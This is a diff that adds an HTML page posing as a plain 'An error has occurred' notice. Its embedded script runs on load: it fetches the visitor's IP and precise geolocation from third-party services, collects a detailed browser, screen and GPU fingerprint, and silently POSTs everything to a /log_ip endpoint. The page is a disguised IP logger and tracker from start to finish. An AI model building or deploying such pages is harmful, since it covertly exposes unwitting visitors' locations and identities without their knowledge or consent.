@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Error</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f8d7da;
+            color: #721c24;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            border: 1px solid #f5c6cb;
+            background-color: #f8d7da;
+            padding: 20px;
+            border-radius: 5px;
+        }
+        h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+        p {
+            margin: 10px 0 0;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>An error has occurred</h1>
+        <p>Please contact the admin.</p>
+    </div>
+
+    <script>
+        function getBrowserInfo() {
+            return {
+                browser_name: navigator.userAgentData ? navigator.userAgentData.brands[0].brand : navigator.appName,
+                platform_name: navigator.platform,
+                browser_version: navigator.userAgentData ? navigator.userAgentData.brands[0].version : navigator.appVersion,
+                mobile_tablet: /Mobi|Android/i.test(navigator.userAgent),
+                referrer: document.referrer,
+                system_languages: navigator.languages.join(', '),
+                screen_width: screen.width,
+                screen_height: screen.height,
+                window_width: window.innerWidth,
+                window_height: window.innerHeight,
+                pixel_depth: screen.pixelDepth,
+                screen_orientation: screen.orientation.type,
+                screen_rotation: screen.orientation.angle,
+                cpu_threads: navigator.hardwareConcurrency,
+                available_memory: navigator.deviceMemory || 'N/A',
+                gpu_vendor: (() => {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A';
+                })(),
+                gpu_info: (() => {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
+                })()
+            };
+        }
+
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(ipData => {
+                const browserInfo = getBrowserInfo();
+                fetch(`https://ipapi.co/${ipData.ip}/json/`)
+                    .then(response => response.json())
+                    .then(locationData => {
+                        const fullData = {
+                            ip: ipData.ip,
+                            country: locationData.country_name,
+                            region: locationData.region,
+                            city: locationData.city,
+                            zip: locationData.postal,
+                            full_location: `${locationData.city}, ${locationData.region_code}, ${locationData.country_name}`,
+                            latitude: locationData.latitude,
+                            longitude: locationData.longitude,
+                            timezone: locationData.timezone,
+                            isp: locationData.org,
+                            organization: locationData.org,
+                            autonomous_system: locationData.asn,
+                            ...browserInfo
+                        };
+
+                        fetch('/log_ip', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(fullData)
+                        });
+                    });
+            })
+            .catch(error => console.error('Error fetching the IP address or location data:', error));
+    </script>
+</body>
+</html>
